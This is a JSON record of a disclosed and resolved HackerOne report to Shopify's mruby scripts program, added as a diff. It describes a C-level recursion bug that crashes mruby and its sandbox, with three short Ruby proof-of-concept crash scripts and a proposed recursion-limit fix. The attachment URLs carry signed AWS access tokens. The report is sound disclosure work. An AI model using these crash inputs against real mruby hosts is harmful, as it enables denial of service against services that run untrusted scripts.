@@ -1,0 +1,239 @@
+{
+  "id": 189633,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODk2MzM=",
+  "url": "https://hackerone.com/reports/189633",
+  "title": "Certain inputs cause tight C-level recursion leading to process stack overflow",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2016-12-08T22:16:40.299Z",
+  "submitted_at": "2016-12-08T22:16:40.299Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "dkasak",
+    "url": "/dkasak",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/122/858/df3e45a00fd0f5e53ef7dc7f9b12168cbde93200_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 15668,
+    "url": "https://hackerone.com/shopify-scripts",
+    "handle": "shopify-scripts",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/1d3351b56b27c9bb56ce22821a57514a7210186a77aefb760cd2113272723c1f"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "shopify-scripts",
+      "twitter_handle": "",
+      "website": "",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2017-03-14T22:22:39.902Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-03-14T22:22:39.853Z",
+  "team_member_agreed_on_going_public_at": "2017-03-14T21:08:23.756Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Introduction\n============\n\nCertain legal Ruby programs can cause a tight recursion on the C-level (without using `eval`) while spending very little of the Ruby-level stack. This precludes triggering a Ruby stack overflow exception and eventually leads to a process stack overflow and a segfault. Both vanilla mruby and mruby running inside mruby-engine are vulnerable.\n\nProof of concept\n================\n\nrecursive_to_i.rb:\n------------------\n\n    def to_i\n        '' * self\n    end\n\n    to_i\n\n1. Save the above code as `recursive_to_i.rb`.\n2. Run either:\n   a) `mruby recursive_to_i.rb`\n   b) `sandbox recursive_to_i.rb`\n3. Both cause a segfault due to a process stack overflow.\n\nDiscussion\n==========\n\nEverything below assumes the latest master of the mruby repository as of Dec 08th, which is commit `b84e005fc36a3c669586cc66ab3c87630d7a5509`.\n\nSince the above POC redefines `to_i` on `Object`, it is very easy to trigger the crash afterwards, for instance, by trying to use any subclass of `Object` without its own `to_i` in an integer context.\n\nIncidentally, that mruby uses `to_i` for implicit conversion to an `Integer` seems wrong (the offending code being in object.c, line 561). For instance, MRI Ruby gives the following for the above POC:\n\n    recursive_to_i.rb:2:in `*': no implicit conversion of Object into Integer (TypeError)\n            from recursive_to_i.rb:2:in `to_i'\n            from recursive_to_i.rb:5:in `<main>'<Paste>\n\nHowever, the problem isn't limited to overriding `to_i`. Some other inputs that exploit the same bug:\n\nnil_method_ensure.rb\n--------------------\n\n    def nil.m\n        m a ensure m + a\n    end\n\n    nil.m\n\nThis one crashes only mruby and not the sandbox:\n\nmodule_new_do.rb\n----------------\n\n    def a\n        Module.new do\n            a\n        end\n    end\n\n    a\n\nThere are probably others since the underlying cause is the same.\n\nSolution\n========\n\nWhile there may be a way to fix these cases individually, it is our opinion that the C-level recursion depth should be tracked and, ideally, limited according to the size of the process stack.\n\nWe managed to produce recursions that spend as much as 3200 bytes of the process stack between two recursive `mrb_vm_run` calls while only spending 80 bytes of the Ruby stack. Based on some testing, we've derived a loose upper limit of the number of recursions needed to crash the interpreter in this scenario:\n\n    (stack_size * 0.98) / 3200\n\nTightening the factors up a bit, we arrive at the following formula that should give a good safety margin (assumptions: 10% of the stack used before first call to `mrb_vm_run`, 4096 bytes of the process stack used between two recursive calls):\n\n    (stack_size * 0.9) / 4096 - 1\n\nWe supply a patch where we've implemented C-level recursion depth tracking based on this formula, hardcoded to a stack size of 8 MiB (defined as a macro constant). Ideally, the process stack size should be determined using a method appropriate for the OS (for instance, `getrlimit` on POSIX).\n\n--\nDenis Kasak\nDamir Jelić",
+  "bounty_amount": "10000.0",
+  "formatted_bounty": "$10,000",
+  "weakness": {
+    "id": 2,
+    "name": "Memory Corruption - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 141844,
+      "file_name": "recursive_to_i.rb",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/141/844/6576345b6dd29de0f7d5db6cb80fca34e26c4591/recursive_to_i.rb?response-content-disposition=attachment%3B%20filename%3D%22recursive_to_i.rb%22%3B%20filename%2A%3DUTF-8%27%27recursive_to_i.rb&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7OOT6FU6%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T064049Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDau8o07ZT9YjNXN%2Fx3dJW83AFEa97L5H7qvuoGWAatgwIhAK5EeJdOz8cTex5lk7Icr%2FAGw9gGe7N8yPxWkZvz6OMBKrIFCH8QAxoMMDEzNjE5Mjc0ODQ5IgwNGD0w%2FE1rj02PnEMqjwV7sTFyl66Zhj3q6VvflIOV774ZBUtactLTQ7OTuxh2V7IoRSxJd4reFmPqywY1pQI3ohQGR%2F6Z4%2B6148G%2FaVf99gzkkUt60e5vpI1CrUXhNkZe0Cnt65gnKszvJ0E3cKnCNbCd%2BJIceGT1xfdM%2F%2FlLvBoRiNjIdZGx70Bob9p5iuj2XB9gn93NRNTB8W4eNn4%2FGS1FJAQgMm6WOjhgywMuf%2F4NoIJxvY5cPrsytWhO22%2Fi%2F%2BtwQAwr2Ps76LTcmilpZxeLKjJd%2Bg6%2BJeJ1X7LR2J3fYPzqLrqGCKWo537p%2FNNs3kUa4ZgiPZPlE6A5%2FUfnu0lLIu3zPCbxf8ZjOosdC%2Bf2U4oRk0m7FBSQdU86sdlko2zM8W57IxDaJG9vdc0PTdutWur5Fo4xviLTAShXZ6HF%2FQ%2F1ww48JNO3zTUS4DpDJAtQXvk93q81wqqqKTILpba91EA6uCFYxS4WezEOao6P4U79uwXuCvBswGFYWliOPt9jy24lQO46XJ64vlLbpNLHHPnbZUeZ8z35SNCCh3Ojb6PW76ezuKrDMDMgEi10hb%2FzNTSC9exnpfcSi5GoC18LIv2gLurb4ISIv7Izxn7%2F7xnqoJOUFpsJGbEvURBVdlNJCRs6GSVCyycFkEamtYgpZ7Bc1LWiaWD6kDg8UC6C%2FnM5RBR0fl1b7%2Bu2kTAZpUdvsQ9lmtSbrUidMNl%2FRMyBdqoYkv3LuSArs%2FfGBZz%2FbyGeGVa%2F88q%2FqueKAusz536dKl0%2FCw%2Be9HlVN0oQXG%2BQpxYXFYVBL9qMP2UKEr52Sqf72YY0YCf3mURjShuRvxQtQAGMtS2kV9nuhtmxmRNtraWhYnRP97djzPev2eZ5%2BDNdNaUd2HzyuIiXMObYt9IGOrABGwx81VQBwIHF1Mx8snRixl4KLsibvdpsF5WZQOAxKdJ%2FiupnTZfKHwmBwQNZLnDXMVseiAsn9E5PlQq%2FCnGJOz%2FoJe34qyw4sR65qpCp1uGsb0T87GzxVLlbC4mlk5eT9879JfBv5I7wUdi%2FDr4%2BxS3U39PmNcQeVp0PElM%2FzN7fPtiZ%2BuBBPXsivzwqVaC6JGLtl0dyXTvdZbUAwTxk2hsut1ezrRk%2BlPyQuGw5QUY%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=48dbd3864c82646cb6fcd9329b871c42618cc279eb75ee84905131f5b186555a",
+      "file_size": 33,
+      "type": "text/plain",
+      "moderated": null
+    },
+    {
+      "id": 141845,
+      "file_name": "nil_method_ensure.rb",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/141/845/e56137747f7b994e0966527af7a92c24ac2e342b/nil_method_ensure.rb?response-content-disposition=attachment%3B%20filename%3D%22nil_method_ensure.rb%22%3B%20filename%2A%3DUTF-8%27%27nil_method_ensure.rb&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7OOT6FU6%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T064049Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDau8o07ZT9YjNXN%2Fx3dJW83AFEa97L5H7qvuoGWAatgwIhAK5EeJdOz8cTex5lk7Icr%2FAGw9gGe7N8yPxWkZvz6OMBKrIFCH8QAxoMMDEzNjE5Mjc0ODQ5IgwNGD0w%2FE1rj02PnEMqjwV7sTFyl66Zhj3q6VvflIOV774ZBUtactLTQ7OTuxh2V7IoRSxJd4reFmPqywY1pQI3ohQGR%2F6Z4%2B6148G%2FaVf99gzkkUt60e5vpI1CrUXhNkZe0Cnt65gnKszvJ0E3cKnCNbCd%2BJIceGT1xfdM%2F%2FlLvBoRiNjIdZGx70Bob9p5iuj2XB9gn93NRNTB8W4eNn4%2FGS1FJAQgMm6WOjhgywMuf%2F4NoIJxvY5cPrsytWhO22%2Fi%2F%2BtwQAwr2Ps76LTcmilpZxeLKjJd%2Bg6%2BJeJ1X7LR2J3fYPzqLrqGCKWo537p%2FNNs3kUa4ZgiPZPlE6A5%2FUfnu0lLIu3zPCbxf8ZjOosdC%2Bf2U4oRk0m7FBSQdU86sdlko2zM8W57IxDaJG9vdc0PTdutWur5Fo4xviLTAShXZ6HF%2FQ%2F1ww48JNO3zTUS4DpDJAtQXvk93q81wqqqKTILpba91EA6uCFYxS4WezEOao6P4U79uwXuCvBswGFYWliOPt9jy24lQO46XJ64vlLbpNLHHPnbZUeZ8z35SNCCh3Ojb6PW76ezuKrDMDMgEi10hb%2FzNTSC9exnpfcSi5GoC18LIv2gLurb4ISIv7Izxn7%2F7xnqoJOUFpsJGbEvURBVdlNJCRs6GSVCyycFkEamtYgpZ7Bc1LWiaWD6kDg8UC6C%2FnM5RBR0fl1b7%2Bu2kTAZpUdvsQ9lmtSbrUidMNl%2FRMyBdqoYkv3LuSArs%2FfGBZz%2FbyGeGVa%2F88q%2FqueKAusz536dKl0%2FCw%2Be9HlVN0oQXG%2BQpxYXFYVBL9qMP2UKEr52Sqf72YY0YCf3mURjShuRvxQtQAGMtS2kV9nuhtmxmRNtraWhYnRP97djzPev2eZ5%2BDNdNaUd2HzyuIiXMObYt9IGOrABGwx81VQBwIHF1Mx8snRixl4KLsibvdpsF5WZQOAxKdJ%2FiupnTZfKHwmBwQNZLnDXMVseiAsn9E5PlQq%2FCnGJOz%2FoJe34qyw4sR65qpCp1uGsb0T87GzxVLlbC4mlk5eT9879JfBv5I7wUdi%2FDr4%2BxS3U39PmNcQeVp0PElM%2FzN7fPtiZ%2BuBBPXsivzwqVaC6JGLtl0dyXTvdZbUAwTxk2hsut1ezrRk%2BlPyQuGw5QUY%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1e981d63e74192610a64e961f12df373146cb8f576b8f92fe2256c0a32042f1a",
+      "file_size": 39,
+      "type": "text/plain",
+      "moderated": null
+    },
+    {
+      "id": 141846,
+      "file_name": "module_new_do.rb",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/141/846/94476de134c28ddfb995697704eae6ea6b9b2d55/module_new_do.rb?response-content-disposition=attachment%3B%20filename%3D%22module_new_do.rb%22%3B%20filename%2A%3DUTF-8%27%27module_new_do.rb&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7OOT6FU6%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T064049Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDau8o07ZT9YjNXN%2Fx3dJW83AFEa97L5H7qvuoGWAatgwIhAK5EeJdOz8cTex5lk7Icr%2FAGw9gGe7N8yPxWkZvz6OMBKrIFCH8QAxoMMDEzNjE5Mjc0ODQ5IgwNGD0w%2FE1rj02PnEMqjwV7sTFyl66Zhj3q6VvflIOV774ZBUtactLTQ7OTuxh2V7IoRSxJd4reFmPqywY1pQI3ohQGR%2F6Z4%2B6148G%2FaVf99gzkkUt60e5vpI1CrUXhNkZe0Cnt65gnKszvJ0E3cKnCNbCd%2BJIceGT1xfdM%2F%2FlLvBoRiNjIdZGx70Bob9p5iuj2XB9gn93NRNTB8W4eNn4%2FGS1FJAQgMm6WOjhgywMuf%2F4NoIJxvY5cPrsytWhO22%2Fi%2F%2BtwQAwr2Ps76LTcmilpZxeLKjJd%2Bg6%2BJeJ1X7LR2J3fYPzqLrqGCKWo537p%2FNNs3kUa4ZgiPZPlE6A5%2FUfnu0lLIu3zPCbxf8ZjOosdC%2Bf2U4oRk0m7FBSQdU86sdlko2zM8W57IxDaJG9vdc0PTdutWur5Fo4xviLTAShXZ6HF%2FQ%2F1ww48JNO3zTUS4DpDJAtQXvk93q81wqqqKTILpba91EA6uCFYxS4WezEOao6P4U79uwXuCvBswGFYWliOPt9jy24lQO46XJ64vlLbpNLHHPnbZUeZ8z35SNCCh3Ojb6PW76ezuKrDMDMgEi10hb%2FzNTSC9exnpfcSi5GoC18LIv2gLurb4ISIv7Izxn7%2F7xnqoJOUFpsJGbEvURBVdlNJCRs6GSVCyycFkEamtYgpZ7Bc1LWiaWD6kDg8UC6C%2FnM5RBR0fl1b7%2Bu2kTAZpUdvsQ9lmtSbrUidMNl%2FRMyBdqoYkv3LuSArs%2FfGBZz%2FbyGeGVa%2F88q%2FqueKAusz536dKl0%2FCw%2Be9HlVN0oQXG%2BQpxYXFYVBL9qMP2UKEr52Sqf72YY0YCf3mURjShuRvxQtQAGMtS2kV9nuhtmxmRNtraWhYnRP97djzPev2eZ5%2BDNdNaUd2HzyuIiXMObYt9IGOrABGwx81VQBwIHF1Mx8snRixl4KLsibvdpsF5WZQOAxKdJ%2FiupnTZfKHwmBwQNZLnDXMVseiAsn9E5PlQq%2FCnGJOz%2FoJe34qyw4sR65qpCp1uGsb0T87GzxVLlbC4mlk5eT9879JfBv5I7wUdi%2FDr4%2BxS3U39PmNcQeVp0PElM%2FzN7fPtiZ%2BuBBPXsivzwqVaC6JGLtl0dyXTvdZbUAwTxk2hsut1ezrRk%2BlPyQuGw5QUY%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5143665d4c710a7202077837f79d57306ffe91cb59d4eef92d45c00a7ba0223a",
+      "file_size": 49,
+      "type": "text/plain",
+      "moderated": null
+    },
+    {
+      "id": 141847,
+      "file_name": "recursion_limit.patch",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/141/847/8982788f1dd9880b1891614805258659d2b48e56/recursion_limit.patch?response-content-disposition=attachment%3B%20filename%3D%22recursion_limit.patch%22%3B%20filename%2A%3DUTF-8%27%27recursion_limit.patch&response-content-type=text%2Fx-diff&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7OOT6FU6%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T064049Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDau8o07ZT9YjNXN%2Fx3dJW83AFEa97L5H7qvuoGWAatgwIhAK5EeJdOz8cTex5lk7Icr%2FAGw9gGe7N8yPxWkZvz6OMBKrIFCH8QAxoMMDEzNjE5Mjc0ODQ5IgwNGD0w%2FE1rj02PnEMqjwV7sTFyl66Zhj3q6VvflIOV774ZBUtactLTQ7OTuxh2V7IoRSxJd4reFmPqywY1pQI3ohQGR%2F6Z4%2B6148G%2FaVf99gzkkUt60e5vpI1CrUXhNkZe0Cnt65gnKszvJ0E3cKnCNbCd%2BJIceGT1xfdM%2F%2FlLvBoRiNjIdZGx70Bob9p5iuj2XB9gn93NRNTB8W4eNn4%2FGS1FJAQgMm6WOjhgywMuf%2F4NoIJxvY5cPrsytWhO22%2Fi%2F%2BtwQAwr2Ps76LTcmilpZxeLKjJd%2Bg6%2BJeJ1X7LR2J3fYPzqLrqGCKWo537p%2FNNs3kUa4ZgiPZPlE6A5%2FUfnu0lLIu3zPCbxf8ZjOosdC%2Bf2U4oRk0m7FBSQdU86sdlko2zM8W57IxDaJG9vdc0PTdutWur5Fo4xviLTAShXZ6HF%2FQ%2F1ww48JNO3zTUS4DpDJAtQXvk93q81wqqqKTILpba91EA6uCFYxS4WezEOao6P4U79uwXuCvBswGFYWliOPt9jy24lQO46XJ64vlLbpNLHHPnbZUeZ8z35SNCCh3Ojb6PW76ezuKrDMDMgEi10hb%2FzNTSC9exnpfcSi5GoC18LIv2gLurb4ISIv7Izxn7%2F7xnqoJOUFpsJGbEvURBVdlNJCRs6GSVCyycFkEamtYgpZ7Bc1LWiaWD6kDg8UC6C%2FnM5RBR0fl1b7%2Bu2kTAZpUdvsQ9lmtSbrUidMNl%2FRMyBdqoYkv3LuSArs%2FfGBZz%2FbyGeGVa%2F88q%2FqueKAusz536dKl0%2FCw%2Be9HlVN0oQXG%2BQpxYXFYVBL9qMP2UKEr52Sqf72YY0YCf3mURjShuRvxQtQAGMtS2kV9nuhtmxmRNtraWhYnRP97djzPev2eZ5%2BDNdNaUd2HzyuIiXMObYt9IGOrABGwx81VQBwIHF1Mx8snRixl4KLsibvdpsF5WZQOAxKdJ%2FiupnTZfKHwmBwQNZLnDXMVseiAsn9E5PlQq%2FCnGJOz%2FoJe34qyw4sR65qpCp1uGsb0T87GzxVLlbC4mlk5eT9879JfBv5I7wUdi%2FDr4%2BxS3U39PmNcQeVp0PElM%2FzN7fPtiZ%2BuBBPXsivzwqVaC6JGLtl0dyXTvdZbUAwTxk2hsut1ezrRk%2BlPyQuGw5QUY%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5ba8a85a28b0fa5844a209d00fe0a8c01954ad5f932a9565bd14024a62c1ee68",
+      "file_size": 2389,
+      "type": "text/x-diff",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2017-04-13T21:08:23.802Z",
+  "allow_singular_disclosure_after": -291375145.67562276,
+  "singular_disclosure_allowed": true,
+  "vote_count": 11,
+  "voters": [
+    "dkasak",
+    "dgaletic",
+    "dz_samir",
+    "eveeez",
+    "grampae",
+    "t4ym",
+    "japz",
+    "spetr0x",
+    "bughuntergr",
+    "localhost1st",
+    "and 1 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.6,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "none",
+      "integrity": "none",
+      "availability": "high"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "189633",
+  "votes": 11,
+  "latest_disclosable_activity_at": "2017-03-14T22:22:39.919Z",
+  "_metadata": {
+    "saved_at": "2026-07-08T14:40:49.601076",
+    "source": "https://hackerone.com/reports/189633.json",
+    "report_id": 189633
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODk2MzM=",
+    "databaseId": "189633",
+    "title": "Certain inputs cause tight C-level recursion leading to process stack overflow",
+    "url": "https://hackerone.com/reports/189633",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2017-03-14T22:22:39.902Z",
+    "created_at": "2016-12-08T22:16:40.299Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzI=",
+      "name": "Memory Corruption - Generic",
+      "external_id": "cwe-119"
+    },
+    "severity": {
+      "rating": "high",
+      "score": 8.6
+    },
+    "reporter": {
+      "username": "dkasak"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzE1NjY4",
+      "handle": "shopify-scripts",
+      "name": "shopify-scripts",
+      "url": "https://hackerone.com/shopify-scripts",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS80Mzk5Nw==",
+            "amount": "10000.00",
+            "awarded_amount": "10000.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2017-03-14T21:08:17.578Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzE4OTYzMw==",
+    "_id": "189633",
+    "disclosed": true,
+    "votes": 11,
+    "latest_disclosable_activity_at": "2017-03-14T22:22:39.919Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODk2MzM=",
+      "databaseId": "189633",
+      "title": "Certain inputs cause tight C-level recursion leading to process stack overflow",
+      "url": "https://hackerone.com/reports/189633",
+      "disclosed_at": "2017-03-14T22:22:39.902Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzE1NjY4",
+      "handle": "shopify-scripts",
+      "name": "shopify-scripts",
+      "url": "https://hackerone.com/shopify-scripts",
+      "currency": "usd"
+    }
+  }
+}
